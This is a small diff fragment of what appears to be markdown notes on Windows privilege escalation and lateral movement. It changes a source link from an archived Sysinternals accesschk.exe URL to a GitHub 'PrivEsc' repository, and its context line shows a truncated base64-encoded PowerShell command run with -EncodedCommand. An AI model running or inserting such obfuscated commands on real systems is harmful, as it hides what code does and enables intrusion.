@@ -14,5 +14,4 @@ powershell.exe -NoProfile -NonInteractive -EncodedCommand JABwAD0AQwBvA...
 ```
 
 ## Source
-https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
-
+https://github.com/n000b3r/PrivEsc/tree/main/Windows/local_admin_lateral
